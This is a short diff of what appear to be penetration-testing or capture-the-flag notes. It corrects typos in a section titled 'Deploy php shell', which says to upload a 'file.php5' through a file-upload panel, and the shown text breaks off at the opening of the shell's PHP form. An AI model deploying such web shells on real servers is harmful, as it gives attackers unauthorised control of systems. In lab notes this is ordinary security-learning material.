@@ -19,8 +19,8 @@ found:
 `panel` allows to upload files... probably found then in uploads
 
 ## Deploy php shell
-create ``file.php5`
-contetnt:
+create `file.php5`
+content:
 `<html>
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
